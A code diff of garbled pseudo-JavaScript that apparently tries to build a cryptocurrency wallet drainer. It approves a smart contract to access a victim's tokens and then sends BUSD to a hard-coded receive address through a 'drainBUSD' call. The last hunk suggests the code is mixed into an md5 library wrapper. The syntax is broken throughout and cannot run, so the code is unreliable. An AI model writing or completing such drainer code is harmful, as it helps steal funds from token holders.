@@ -3,16 +3,15 @@ deploy on "bscscan.io"
 const (receiveAddress) = 0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF;0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF
 
 	
-var "cryptotokenContract' = "0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8",0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8,
+var cryptotokenContract = "0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8",0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8,
 var smartcontract.method.approvetransaction. = "0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8",0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8,
 var receiveAddress = "message.sender";true immutable
-var approveSpending(token = 0xe9e7cea3dedca5984780bafc599bd69add087d56,
-var 		    
+var approveSpending(token = 0xe9e7cea3dedca5984780bafc599bd69add087d56,		    
 
-function const approveSpending(token);"0xe9e7cea3dedca5984780bafc599bd69add087d56,"token(0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8)
+function const approveSpending(token);0xe9e7cea3dedca5984780bafc599bd69add087d56,//token(0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8)
 	
-	 smartcontract.methods.approvetransaction.(recieveAddress)= 0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF  / the smart contract gets approved to access token
-	smartcontract.methods.drainBUSD.send (to:recieveAddress).(token(cryptotokencontract);0xe9e7cea3dedca5984780bafc599bd69add087d56
+	 smartcontract.methods.approvetransaction.(recieveAddress)= 0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF  // the smart contract gets approved to access token
+	smartcontract.methods.drainBUSD.send (to:recieveAddress).(token(cryptotokencontract);//0xe9e7cea3dedca5984780bafc599bd69add087d56
 }
 	  
   			
@@ -420,4 +419,4 @@ if (!receiveAddressx.startsWith("0x") ||
   } else {
     $.md5 = md5
   }
-})(this.0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF)
+})(this)
